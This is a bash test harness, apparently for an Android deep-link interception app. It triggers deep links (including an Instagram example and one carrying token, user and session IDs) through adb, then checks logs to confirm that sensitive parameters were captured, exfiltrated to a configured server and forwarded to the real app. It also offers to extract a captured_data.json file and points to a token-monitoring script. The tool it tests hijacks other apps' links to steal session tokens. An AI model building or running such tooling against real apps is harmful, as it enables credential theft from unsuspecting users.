#!/bin/bash

# Script to test deep link interception

# Usage: ./test_deeplink.sh [scheme://path] OR ./test_deeplink.sh (reads from config)

set -e

echo "═══════════════════════════════════════════════════════════════"
echo "🔗 Deep Link Proxy - Test Script"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Check if device is connected
if ! adb devices | grep -q "device$"; then
    echo "❌ No Android device connected!"
    echo "   Connect a device or start an emulator"
    exit 1
fi

echo "✅ Device connected"
echo ""

# Get scheme from argument or config
if [ -n "$1" ]; then
    DEEP_LINK="$1"
    SCHEME=$(echo "$DEEP_LINK" | cut -d':' -f1)
else
    # Try to read from config.xml
    CONFIG_FILE="app/src/main/res/values/config.xml"
    if [ -f "$CONFIG_FILE" ]; then
        SCHEME=$(grep 'name="deep_link_scheme"' "$CONFIG_FILE" | sed -n 's/.*<string name="deep_link_scheme">\(.*\)<\/string>.*/\1/p')
        if [ -z "$SCHEME" ] || [ "$SCHEME" = "myapp" ]; then
            echo "⚠️  Default scheme detected. Please configure config.xml or provide scheme:"
            echo "   Usage: $0 SCHEME://path"
            echo "   Example: $0 instagram://test"
            exit 1
        fi
        DEEP_LINK="${SCHEME}://test?param=value"
    else
        echo "❌ Config file not found and no deep link provided!"
        echo "   Usage: $0 SCHEME://path"
        exit 1
    fi
fi

echo "Testing scheme: $SCHEME"
echo "Deep link: $DEEP_LINK"
echo ""

# Test 1: Basic deep link
echo "Test 1: Basic Deep Link Interception"
echo "──────────────────────────────────────────────────────────────"
echo "Triggering: $DEEP_LINK"
echo ""

adb logcat -c  # Clear logs
adb shell am start -a android.intent.action.VIEW -d "$DEEP_LINK" > /dev/null 2>&1

sleep 2
echo "📋 Logs:"
adb logcat -d | grep "DeepLinkProxy" | tail -10

echo ""
echo "──────────────────────────────────────────────────────────────"
echo ""

# Test 2: Deep link with sensitive parameters
echo "Test 2: Token/Sensitive Parameter Detection"
echo "──────────────────────────────────────────────────────────────"
TEST_LINK_2="${SCHEME}://action?tokenId=test-token-123&userId=user_456&sessionId=sess_789"
echo "Triggering: $TEST_LINK_2"
echo ""

adb logcat -c
adb shell am start -a android.intent.action.VIEW -d "$TEST_LINK_2" > /dev/null 2>&1

sleep 2
echo "📋 Sensitive params detected:"
adb logcat -d | grep "🔑 SENSITIVE" || echo "   (none found - check logs)"

echo ""
echo "──────────────────────────────────────────────────────────────"
echo ""

# Test 3: Check if data was sent to server
echo "Test 3: Server Exfiltration"
echo "──────────────────────────────────────────────────────────────"
echo "Checking if data was sent to server..."
echo ""

if adb logcat -d | grep -q "✅ Data successfully exfiltrated"; then
    echo "✅ Data successfully sent to server!"
    
    # Try to get server URL from config
    if [ -f "$CONFIG_FILE" ]; then
        SERVER_URL=$(grep 'name="server_url"' "$CONFIG_FILE" | sed -n 's/.*<string name="server_url">\(.*\)<\/string>.*/\1/p')
        if [ -n "$SERVER_URL" ]; then
            echo ""
            echo "📡 Check your server at: $SERVER_URL"
        fi
    fi
else
    echo "⚠️  Could not confirm server exfiltration"
    echo "   Check logs manually: adb logcat | grep DeepLinkProxy"
fi

echo ""
echo "──────────────────────────────────────────────────────────────"
echo ""

# Test 4: Check if forwarding worked
echo "Test 4: Forwarding to Target App"
echo "──────────────────────────────────────────────────────────────"

if adb logcat -d | grep -q "Forwarded to real app"; then
    echo "✅ Successfully forwarded to target app!"
    TARGET_PKG=$(grep 'name="target_package"' "$CONFIG_FILE" 2>/dev/null | sed -n 's/.*<string name="target_package">\(.*\)<\/string>.*/\1/p')
    if [ -n "$TARGET_PKG" ]; then
        echo "   Target package: $TARGET_PKG"
    fi
else
    echo "⚠️  Forwarding status unclear"
    echo "   Check if target app is installed"
fi

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "✅ Testing Complete!"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "📚 Next steps:"
echo "  1. Check captured data: ./extract_logs.sh"
echo "  2. Monitor real-time: ./monitor_tokens.sh"
echo "  3. View full logs: adb logcat | grep DeepLinkProxy"
echo ""

# Offer to show captured data
read -p "📁 Extract captured data now? (y/n): " EXTRACT_NOW

if [ "$EXTRACT_NOW" = "y" ] || [ "$EXTRACT_NOW" = "Y" ]; then
    echo ""
    if [ -f "./extract_logs.sh" ]; then
        ./extract_logs.sh
    else
        echo "Extracting manually..."
        PACKAGE="com.example.deeplink"
        adb shell "run-as $PACKAGE cat /data/data/$PACKAGE/files/captured_data.json" 2>/dev/null || echo "❌ Could not extract data"
    fi
fi

echo ""
echo "Done!"
